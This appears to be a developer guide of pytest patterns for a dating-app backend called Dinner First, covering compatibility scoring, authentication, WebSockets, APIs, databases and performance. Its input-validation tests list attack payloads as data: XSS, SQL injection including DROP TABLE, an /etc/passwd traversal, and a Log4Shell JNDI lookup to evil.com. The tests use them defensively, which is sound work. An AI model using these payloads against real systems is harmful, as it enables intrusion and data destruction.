# Testing Patterns & Examples

Comprehensive collection of testing patterns and real-world examples for the Dinner First backend.

## Table of Contents

1. [Soul Connection Testing Patterns](#soul-connection-testing-patterns)
2. [Authentication & Security Patterns](#authentication--security-patterns)
3. [Async & WebSocket Patterns](#async--websocket-patterns)
4. [API Testing Patterns](#api-testing-patterns)
5. [Database Testing Patterns](#database-testing-patterns)
6. [Performance Testing Patterns](#performance-testing-patterns)
7. [Error Handling Patterns](#error-handling-patterns)
8. [Mock & Stub Patterns](#mock--stub-patterns)

## Soul Connection Testing Patterns

### Compatibility Algorithm Testing

```python
class TestSoulCompatibilityAlgorithms:
    """Test patterns for soul compatibility calculations"""
    
    @pytest.fixture
    def compatibility_calculator(self):
        """Reusable compatibility calculator"""
        return SoulCompatibilityService()
    
    @pytest.fixture
    def high_compatibility_pair(self, db_session):
        """Create users with high expected compatibility"""
        setup_factories(db_session)
        
        user1 = UserFactory(
            interests=["cooking", "hiking", "reading", "music"],
            core_values={
                "relationship_goals": "Deep emotional connection and growth",
                "life_philosophy": "Authenticity and mindfulness",
                "communication_style": "I prefer meaningful conversations"
            },
            emotional_depth_score=8.5
        )
        
        user2 = UserFactory(
            interests=["cooking", "travel", "reading", "art"],  # 50% overlap
            core_values={
                "relationship_goals": "Meaningful connection and shared values",
                "life_philosophy": "Authentic living and personal growth", 
                "communication_style": "Deep talks over small talk"
            },
            emotional_depth_score=8.0
        )
        
        return user1, user2
    
    def test_high_compatibility_scoring(self, compatibility_calculator, high_compatibility_pair, db_session):
        """Test that high compatibility users get appropriate scores"""
        user1, user2 = high_compatibility_pair
        
        result = compatibility_calculator.calculate_compatibility(user1, user2, db_session)
        
        # Verify overall score is high
        assert result.total_score >= 75.0
        assert result.match_quality in ["high", "soulmate"]
        
        # Verify component scores
        assert result.interests_score >= 60.0  # 50% overlap should be good
        assert result.values_score >= 70.0     # Similar values
        assert result.confidence >= 80.0       # High data quality
        
        # Verify insights are generated
        assert len(result.strengths) >= 2
        assert "values" in result.compatibility_summary.lower()
    
    @pytest.mark.parametrize("interests1,interests2,expected_min,expected_max", [
        (["cooking"], ["cooking"], 90, 100),  # Perfect match
        (["cooking", "reading"], ["cooking", "music"], 40, 60),  # Partial match
        (["cooking"], ["dancing"], 0, 20),    # No match
        ([], ["cooking"], 0, 10),             # Empty interests
    ])
    def test_interest_compatibility_scenarios(self, compatibility_calculator, interests1, interests2, expected_min, expected_max):
        """Test interest compatibility with various scenarios"""
        score = compatibility_calculator._calculate_interests_compatibility(
            Mock(interests=interests1), 
            Mock(interests=interests2)
        )
        
        assert expected_min <= score <= expected_max
```

### Revelation System Testing

```python
class TestRevelationSystem:
    """Test patterns for revelation system"""
    
    @pytest.fixture
    def revelation_cycle_data(self, db_session):
        """Create complete 7-day revelation cycle"""
        setup_factories(db_session)
        
        connection_data = create_complete_soul_connection(db_session)
        connection = connection_data["connection"]
        users = connection_data["users"]
        
        # Create revelations for each day
        revelations = []
        for day in range(1, 8):
            revelation = DailyRevelationFactory(
                connection_id=connection.id,
                sender_id=users[0].id,
                day_number=day,
                revelation_type=RevelationType(f"day_{day}"),
                content=f"Day {day}: Authentic revelation content about personal growth"
            )
            revelations.append(revelation)
        
        return {
            "connection": connection,
            "users": users,
            "revelations": revelations
        }
    
    def test_revelation_progression_workflow(self, client, authenticated_user, revelation_cycle_data):
        """Test complete revelation progression workflow"""
        connection = revelation_cycle_data["connection"]
        
        # Test getting revelation timeline
        response = client.get(
            f"/api/v1/revelations/timeline/{connection.id}",
            headers=authenticated_user["headers"]
        )
        
        assert response.status_code == 200
        timeline = response.json()
        
        # Verify all 7 days are present
        assert len(timeline["revelations"]) == 7
        assert timeline["cycle_complete"] is True
        
        # Test creating new revelation
        response = client.post(
            "/api/v1/revelations/create",
            json={
                "connection_id": connection.id,
                "day_number": 8,
                "revelation_type": "bonus_revelation",
                "content": "Additional revelation after cycle completion"
            },
            headers=authenticated_user["headers"]
        )
        
        assert response.status_code == 201
        revelation_data = response.json()
        assert revelation_data["day_number"] == 8
```

## Authentication & Security Patterns

### JWT Token Testing

```python
class TestJWTAuthentication:
    """Security testing patterns for JWT authentication"""
    
    def test_token_lifecycle_complete_flow(self, client, db_session):
        """Test complete token lifecycle from creation to expiration"""
        # Create user
        user_data = {
            "email": "security@test.com",
            "username": "securitytest",
            "password": "SecurePassword123!",
            "first_name": "Security",
            "last_name": "Tester"
        }
        
        # Register user
        response = client.post("/api/v1/auth/register", json=user_data)
        assert response.status_code == 201
        
        # Login and get token
        login_response = client.post("/api/v1/auth/login", json={
            "email": user_data["email"],
            "password": user_data["password"]
        })
        assert login_response.status_code == 200
        
        token_data = login_response.json()
        access_token = token_data["access_token"]
        
        # Use token for authenticated request
        auth_response = client.get(
            "/api/v1/users/me",
            headers={"Authorization": f"Bearer {access_token}"}
        )
        assert auth_response.status_code == 200
        user_info = auth_response.json()
        assert user_info["email"] == user_data["email"]
    
    @pytest.mark.security
    def test_token_security_requirements(self, client, test_user):
        """Test token security requirements and edge cases"""
        valid_token = test_user["token"]
        
        # Test with malformed tokens
        malformed_tokens = [
            "not.a.token",
            "bearer token",
            "",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
            valid_token[:-5] + "xxxxx"  # Modified signature
        ]
        
        for bad_token in malformed_tokens:
            response = client.get(
                "/api/v1/users/me",
                headers={"Authorization": f"Bearer {bad_token}"}
            )
            assert response.status_code == 401
    
    def test_permission_based_access_control(self, client, authenticated_user, db_session):
        """Test access control based on user permissions"""
        # Create another user
        setup_factories(db_session)
        other_user = UserFactory()
        
        # Try to access other user's data
        response = client.get(
            f"/api/v1/users/{other_user.id}",
            headers=authenticated_user["headers"]
        )
        
        # Should either be forbidden or return limited public data
        assert response.status_code in [200, 403, 404]
        
        if response.status_code == 200:
            user_data = response.json()
            # Should not contain sensitive information
            assert "email" not in user_data
            assert "hashed_password" not in user_data
```

### Input Validation Security

```python
class TestInputValidationSecurity:
    """Security patterns for input validation"""
    
    @pytest.mark.security
    @pytest.mark.parametrize("malicious_input", [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/}",
        "{{7*7}}",  # Template injection
        "\x00\x01\x02",  # Binary data
        "A" * 10000,  # Extremely long input
    ])
    def test_malicious_input_sanitization(self, client, authenticated_user, malicious_input):
        """Test that malicious inputs are properly sanitized"""
        # Test in profile bio field
        response = client.put(
            "/api/v1/profiles/me",
            json={"bio": malicious_input},
            headers=authenticated_user["headers"]
        )
        
        # Should not cause server error
        assert response.status_code in [200, 400, 422]
        
        # If accepted, verify it's sanitized
        if response.status_code == 200:
            profile_data = response.json()
            # Should not contain the original malicious content
            assert malicious_input not in str(profile_data)
    
    @pytest.mark.security
    def test_sql_injection_protection(self, client, authenticated_user):
        """Test SQL injection protection in search and filter endpoints"""
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES('hacker', 'evil'); --"
        ]
        
        for injection_attempt in sql_injection_attempts:
            # Test search endpoint
            response = client.get(
                f"/api/v1/users/search?query={injection_attempt}",
                headers=authenticated_user["headers"]
            )
            
            # Should not cause server error
            assert response.status_code in [200, 400, 422]
            
            # Database should still be intact - verify with simple query
            verify_response = client.get(
                "/api/v1/users/me",
                headers=authenticated_user["headers"]
            )
            assert verify_response.status_code == 200
```

## Async & WebSocket Patterns

### WebSocket Connection Testing

```python
class TestWebSocketPatterns:
    """Async testing patterns for WebSocket functionality"""
    
    @pytest.mark.asyncio
    async def test_websocket_connection_lifecycle(self, websocket_test_client, async_realtime_service):
        """Test complete WebSocket connection lifecycle"""
        # Test connection
        success = await websocket_test_client.connect(
            "/ws/connection/123",
            headers={"user_id": "456", "token": "valid_token"}
        )
        assert success is True
        assert websocket_test_client.connected is True
        assert websocket_test_client.user_id == "456"
        
        # Test authentication
        auth_result = await async_realtime_service.validate_websocket_auth("valid_token")
        assert auth_result is not None
        assert auth_result["user_id"] == 1
        
        # Test message sending
        await websocket_test_client.send_json({
            "type": "message",
            "content": "Hello WebSocket",
            "connection_id": 123
        })
        
        # Verify message was queued
        assert len(websocket_test_client.messages_sent) == 1
        sent_message = websocket_test_client.messages_sent[0]
        assert sent_message["type"] == "json"
        assert sent_message["data"]["content"] == "Hello WebSocket"
        
        # Test disconnection
        await websocket_test_client.disconnect()
        assert websocket_test_client.connected is False
    
    @pytest.mark.asyncio
    async def test_websocket_error_handling(self, websocket_test_client, async_realtime_service):
        """Test WebSocket error handling patterns"""
        # Test invalid authentication
        invalid_result = await async_realtime_service.validate_websocket_auth("invalid_token")
        assert invalid_result is None
        
        # Test sending message without connection
        with pytest.raises(Exception, match="WebSocket not connected"):
            await websocket_test_client.send_text("Should fail")
        
        # Test error handling in service
        test_error = Exception("Connection lost")
        error_result = await async_realtime_service.handle_websocket_error(123, test_error)
        
        assert error_result["error_handled"] is True
        assert error_result["connection_id"] == 123
        assert "Connection lost" in error_result["error"]
    
    @pytest.mark.asyncio
    async def test_websocket_typing_indicators(self, async_realtime_service):
        """Test real-time typing indicator functionality"""
        connection_id = 123
        user_id = 456
        
        # Start typing
        result = await async_realtime_service.start_typing_indicator(connection_id, user_id)
        assert result is True
        assert user_id in async_realtime_service.typing_sessions[connection_id]
        
        # Stop typing
        result = await async_realtime_service.stop_typing_indicator(connection_id, user_id)
        assert result is True
        assert user_id not in async_realtime_service.typing_sessions[connection_id]
```

### Async Service Testing

```python
class TestAsyncServicePatterns:
    """Patterns for testing async services"""
    
    @pytest.mark.asyncio
    async def test_async_ai_service_workflow(self, async_ai_service):
        """Test complete async AI service workflow"""
        # Test compatibility insights
        user1_data = {
            "interests": ["cooking", "hiking", "reading"],
            "values": {"growth": True, "adventure": True},
            "personality": {"openness": 0.8, "conscientiousness": 0.7}
        }
        
        user2_data = {
            "interests": ["cooking", "travel", "art"],
            "values": {"growth": True, "creativity": True},
            "personality": {"openness": 0.9, "agreeableness": 0.8}
        }
        
        # Generate insights
        insights = await async_ai_service.generate_compatibility_insights(user1_data, user2_data)
        
        assert "insights" in insights
        assert "confidence" in insights
        assert insights["confidence"] >= 0.8
        assert len(insights["insights"]) >= 2
        
        # Test sentiment analysis
        revelation_text = "I believe in personal growth and building authentic connections"
        sentiment = await async_ai_service.analyze_revelation_sentiment(revelation_text)
        
        assert sentiment["sentiment"] == "positive"
        assert sentiment["emotional_depth"] >= 0.7
        assert "authentic" in sentiment["keywords"]
        
        # Test conversation starters
        starters = await async_ai_service.suggest_conversation_starters(user1_data, user2_data)
        
        assert "suggestions" in starters
        assert len(starters["suggestions"]) >= 2
        assert starters["confidence"] >= 0.7
        
        # Verify all operations were tracked
        expected_calls = [
            "generate_compatibility_insights",
            "analyze_revelation_sentiment", 
            "suggest_conversation_starters"
        ]
        for call in expected_calls:
            assert call in async_ai_service.api_calls
    
    @pytest.mark.asyncio
    async def test_async_performance_monitoring(self, async_performance_monitor, async_ai_service):
        """Test async operation performance monitoring"""
        # Monitor single operation
        user_data1 = {"interests": ["test"]}
        user_data2 = {"interests": ["test"]}
        
        result, duration = await async_performance_monitor.measure_async_operation(
            async_ai_service.generate_compatibility_insights(user_data1, user_data2),
            "ai_compatibility_insights"
        )
        
        assert result["confidence"] > 0.5
        assert duration > 0
        
        # Test concurrent load simulation
        async def ai_task():
            return await async_ai_service.analyze_revelation_sentiment("Test revelation")
        
        load_results = await async_performance_monitor.simulate_concurrent_load(
            ai_task, concurrent_users=5, iterations=3
        )
        
        assert load_results["total_operations"] == 15
        assert load_results["successful"] >= 14  # Allow for some variance
        assert load_results["operations_per_second"] > 0
        
        # Verify metrics were recorded
        metrics = await async_performance_monitor.get_metrics_summary()
        assert "ai_compatibility_insights" in metrics
        assert metrics["ai_compatibility_insights"]["count"] == 1
```

## API Testing Patterns

### RESTful API Testing

```python
class TestAPIPatterns:
    """Comprehensive API testing patterns"""
    
    def test_crud_operations_complete_workflow(self, client, authenticated_user, db_session):
        """Test complete CRUD workflow for soul connections"""
        # CREATE - Create a soul connection
        target_user = UserFactory()
        
        create_response = client.post(
            "/api/v1/connections/initiate",
            json={
                "target_user_id": target_user.id,
                "message": "I'd love to connect with you!"
            },
            headers=authenticated_user["headers"]
        )
        
        assert create_response.status_code == 201
        connection_data = create_response.json()
        connection_id = connection_data["id"]
        
        # READ - Get the connection
        read_response = client.get(
            f"/api/v1/connections/{connection_id}",
            headers=authenticated_user["headers"]
        )
        
        assert read_response.status_code == 200
        retrieved_data = read_response.json()
        assert retrieved_data["id"] == connection_id
        assert retrieved_data["connection_stage"] == "soul_discovery"
        
        # UPDATE - Update connection stage
        update_response = client.put(
            f"/api/v1/connections/{connection_id}/stage",
            json={"new_stage": "revelation_phase"},
            headers=authenticated_user["headers"]
        )
        
        assert update_response.status_code == 200
        updated_data = update_response.json()
        assert updated_data["connection_stage"] == "revelation_phase"
        
        # LIST - Get all connections
        list_response = client.get(
            "/api/v1/connections/active",
            headers=authenticated_user["headers"]
        )
        
        assert list_response.status_code == 200
        connections_list = list_response.json()
        assert len(connections_list) >= 1
        assert any(conn["id"] == connection_id for conn in connections_list)
    
    def test_api_error_handling_patterns(self, client, authenticated_user):
        """Test comprehensive API error handling"""
        # Test 404 - Resource not found
        response = client.get(
            "/api/v1/connections/999999",
            headers=authenticated_user["headers"]
        )
        assert response.status_code == 404
        error_data = response.json()
        assert "error" in error_data or "detail" in error_data
        
        # Test 400 - Bad request
        response = client.post(
            "/api/v1/connections/initiate",
            json={"invalid_field": "invalid_value"},
            headers=authenticated_user["headers"]
        )
        assert response.status_code in [400, 422]
        
        # Test 401 - Unauthorized
        response = client.get("/api/v1/connections/active")
        assert response.status_code == 401
        
        # Test 403 - Forbidden (if accessing another user's data)
        response = client.delete(
            "/api/v1/connections/1",  # Assuming this doesn't belong to test user
            headers=authenticated_user["headers"]
        )
        assert response.status_code in [403, 404]
    
    @pytest.mark.parametrize("invalid_data,expected_status", [
        ({"target_user_id": "not_an_integer"}, 422),
        ({"target_user_id": -1}, 422),
        ({"target_user_id": 999999}, 404),  # Non-existent user
        ({}, 422),  # Missing required field
        ({"target_user_id": None}, 422),
    ])
    def test_api_validation_patterns(self, client, authenticated_user, invalid_data, expected_status):
        """Test API input validation with various invalid inputs"""
        response = client.post(
            "/api/v1/connections/initiate",
            json=invalid_data,
            headers=authenticated_user["headers"]
        )
        
        assert response.status_code == expected_status
```

## Database Testing Patterns

### Transaction and Isolation Testing

```python
class TestDatabasePatterns:
    """Database testing patterns for data integrity"""
    
    def test_transaction_rollback_pattern(self, db_session):
        """Test transaction rollback behavior"""
        # Get initial count
        initial_count = db_session.query(User).count()
        
        # Start transaction that should fail
        try:
            user1 = UserFactory(email="test1@example.com")
            user2 = UserFactory(email="test1@example.com")  # Duplicate email should fail
            db_session.commit()
            assert False, "Should have failed due to duplicate email"
        except Exception:
            db_session.rollback()
        
        # Verify no users were created
        final_count = db_session.query(User).count()
        assert final_count == initial_count
    
    def test_concurrent_access_pattern(self, db_session):
        """Test concurrent database access patterns"""
        # Create base user
        user = UserFactory(email="concurrent@test.com")
        user_id = user.id
        
        # Simulate concurrent updates
        # In real scenario, this would be multiple threads/processes
        from sqlalchemy.orm import sessionmaker
        Session = sessionmaker(bind=db_session.bind)
        
        session1 = Session()
        session2 = Session()
        
        try:
            # Both sessions load the same user
            user1 = session1.query(User).filter_by(id=user_id).first()
            user2 = session2.query(User).filter_by(id=user_id).first()
            
            # Modify in both sessions
            user1.first_name = "Updated1"
            user2.first_name = "Updated2"
            
            # Commit first session
            session1.commit()
            
            # Second session commit should handle concurrency
            # (exact behavior depends on database isolation level)
            try:
                session2.commit()
            except Exception:
                session2.rollback()
            
            # Verify final state is consistent
            final_user = db_session.query(User).filter_by(id=user_id).first()
            assert final_user.first_name in ["Updated1", "Updated2"]
            
        finally:
            session1.close()
            session2.close()
    
    def test_database_constraints_pattern(self, db_session):
        """Test database constraint enforcement"""
        # Test unique constraint
        user1 = UserFactory(email="unique@test.com")
        
        with pytest.raises(Exception):  # Should raise integrity error
            user2 = UserFactory(email="unique@test.com")
            db_session.commit()
        
        db_session.rollback()
        
        # Test foreign key constraint
        with pytest.raises(Exception):
            # Try to create profile with non-existent user_id
            ProfileFactory(user_id=999999)
            db_session.commit()
```

## Performance Testing Patterns

### Benchmark Testing

```python
class TestPerformancePatterns:
    """Performance testing patterns and benchmarks"""
    
    @pytest.mark.performance
    def test_algorithm_performance_benchmark(self, benchmark, high_compatibility_users):
        """Benchmark compatibility algorithm performance"""
        calculator = SoulCompatibilityService()
        user1, user2 = high_compatibility_users
        
        def calculate_compatibility():
            return calculator.calculate_compatibility(user1, user2, Mock())
        
        result = benchmark(calculate_compatibility)
        
        # Verify result is valid
        assert result.total_score > 0
        assert result.confidence > 0
        
        # Performance should be reasonable
        stats = benchmark.stats
        assert stats.mean < 0.1  # Should complete in under 100ms
    
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_concurrent_load_pattern(self, async_performance_monitor):
        """Test system under concurrent load"""
        async def simulate_user_request():
            # Simulate typical user request processing time
            await asyncio.sleep(0.01)  # 10ms processing
            return {"status": "success", "data": "processed"}
        
        # Test with increasing load
        for concurrent_users in [10, 50, 100]:
            results = await async_performance_monitor.simulate_concurrent_load(
                simulate_user_request, 
                concurrent_users=concurrent_users, 
                iterations=5
            )
            
            # Verify all requests completed successfully
            assert results["successful"] == concurrent_users * 5
            assert results["failed"] == 0
            
            # Performance should degrade gracefully
            ops_per_second = results["operations_per_second"]
            avg_time = results["avg_time_per_operation"]
            
            # Log performance metrics for analysis
            print(f"Users: {concurrent_users}, OPS: {ops_per_second:.2f}, Avg: {avg_time:.3f}s")
            
            # Basic performance assertions
            assert ops_per_second > 100  # Minimum throughput
            assert avg_time < 0.1        # Maximum response time
    
    @pytest.mark.performance
    def test_memory_usage_pattern(self, performance_test_data):
        """Test memory usage patterns with large datasets"""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        # Process large dataset
        users = performance_test_data["users"]
        compatibility_results = []
        
        calculator = SoulCompatibilityService()
        
        # Calculate compatibility for all pairs
        for i in range(0, len(users), 2):
            if i + 1 < len(users):
                result = calculator.calculate_compatibility(users[i], users[i+1], Mock())
                compatibility_results.append(result)
        
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be reasonable (less than 100MB for test data)
        assert memory_increase < 100 * 1024 * 1024
        
        # Verify all calculations completed
        assert len(compatibility_results) > 0
```

## Error Handling Patterns

### Exception Testing

```python
class TestErrorHandlingPatterns:
    """Comprehensive error handling testing patterns"""
    
    def test_service_error_recovery_pattern(self, db_session):
        """Test service error recovery and graceful degradation"""
        from app.services.soul_compatibility_service import SoulCompatibilityService
        from unittest.mock import patch
        
        calculator = SoulCompatibilityService()
        user1 = UserFactory()
        user2 = UserFactory()
        
        # Test with database error
        with patch.object(db_session, 'query', side_effect=Exception("Database connection lost")):
            result = calculator.calculate_compatibility(user1, user2, db_session)
            
            # Should return default/fallback result instead of crashing
            assert result is not None
            assert 0 <= result.total_score <= 100
            assert result.match_quality == "medium"  # Default fallback
    
    def test_api_error_response_pattern(self, client, authenticated_user):
        """Test API error response patterns and consistency"""
        # Test various error scenarios
        error_scenarios = [
            ("/api/v1/connections/999999", 404, "not found"),
            ("/api/v1/connections/invalid", 404, "not found"),
        ]
        
        for endpoint, expected_status, expected_error_type in error_scenarios:
            response = client.get(endpoint, headers=authenticated_user["headers"])
            
            assert response.status_code == expected_status
            
            # Verify error response structure
            error_data = response.json()
            assert isinstance(error_data, dict)
            
            # Common error fields should be present
            error_fields = ["detail", "error", "message"]
            assert any(field in error_data for field in error_fields)
    
    @pytest.mark.asyncio
    async def test_async_error_handling_pattern(self, async_ai_service):
        """Test async error handling patterns"""
        # Test with invalid input that should cause error
        invalid_data = {"malformed": "data", "missing": "required_fields"}
        
        # Service should handle errors gracefully
        try:
            result = await async_ai_service.generate_compatibility_insights(invalid_data, invalid_data)
            # If no exception, result should indicate error or default behavior
            assert result is not None
        except Exception as e:
            # If exception occurs, it should be a controlled exception
            assert "invalid" in str(e).lower() or "error" in str(e).lower()
```

## Mock & Stub Patterns

### Service Mocking

```python
class TestMockingPatterns:
    """Patterns for effective mocking and stubbing"""
    
    def test_external_service_mocking_pattern(self, client, authenticated_user):
        """Test mocking external services (email, SMS, etc.)"""
        from unittest.mock import patch, Mock
        
        with patch('app.services.push_notification.PushNotificationService') as mock_notification_service:
            # Configure mock
            mock_instance = Mock()
            mock_instance.send_notification.return_value = {"status": "sent", "id": "notification_123"}
            mock_notification_service.return_value = mock_instance
            
            # Create action that should trigger notification
            response = client.post(
                "/api/v1/connections/initiate",
                json={"target_user_id": 2, "message": "Hello!"},
                headers=authenticated_user["headers"]
            )
            
            # Verify API call succeeded
            assert response.status_code == 201
            
            # Verify notification service was called
            mock_instance.send_notification.assert_called_once()
            call_args = mock_instance.send_notification.call_args
            assert "connection_request" in str(call_args)
    
    def test_database_mocking_pattern(self):
        """Test database operation mocking"""
        from unittest.mock import Mock, patch
        from app.services.soul_compatibility_service import SoulCompatibilityService
        
        calculator = SoulCompatibilityService()
        
        # Mock database session
        mock_session = Mock()
        mock_query = Mock()
        mock_session.query.return_value = mock_query
        mock_query.filter_by.return_value.first.return_value = None
        
        # Mock user objects
        mock_user1 = Mock()
        mock_user1.interests = ["cooking", "reading"]
        mock_user1.core_values = {"growth": "important"}
        mock_user1.emotional_depth_score = 8.0
        
        mock_user2 = Mock()
        mock_user2.interests = ["cooking", "hiking"]
        mock_user2.core_values = {"growth": "essential"}
        mock_user2.emotional_depth_score = 7.5
        
        # Test compatibility calculation with mocked data
        result = calculator.calculate_compatibility(mock_user1, mock_user2, mock_session)
        
        # Verify result is reasonable
        assert result.total_score > 0
        assert result.interests_score > 0  # Should have some overlap
    
    def test_time_mocking_pattern(self):
        """Test time-dependent functionality with mocking"""
        from freezegun import freeze_time
        from datetime import datetime, timedelta
        
        fixed_time = datetime(2024, 1, 15, 12, 0, 0)
        
        with freeze_time(fixed_time):
            # Test revelation timing (revelations are daily)
            user = UserFactory()
            
            # Create revelation "today"
            revelation = DailyRevelationFactory(
                sender_id=user.id,
                day_number=1,
                created_at=datetime.now()
            )
            
            # Move time forward 1 day
            with freeze_time(fixed_time + timedelta(days=1)):
                # Should be able to create next day's revelation
                next_revelation = DailyRevelationFactory(
                    sender_id=user.id,
                    day_number=2,
                    created_at=datetime.now()
                )
                
                # Verify timing logic
                time_diff = next_revelation.created_at - revelation.created_at
                assert time_diff >= timedelta(days=1)
```

## Summary

These testing patterns provide comprehensive coverage for:

- **Soul Connection Logic**: Compatibility algorithms, revelation systems
- **Security**: Authentication, authorization, input validation
- **Async Operations**: WebSocket connections, concurrent processing
- **API Testing**: RESTful endpoints, error handling, validation
- **Database**: Transactions, constraints, concurrent access
- **Performance**: Benchmarks, load testing, memory usage
- **Error Handling**: Exception recovery, graceful degradation
- **Mocking**: External services, database operations, time-dependent code

Use these patterns as templates for writing new tests and ensuring comprehensive coverage of the Dinner First backend functionality.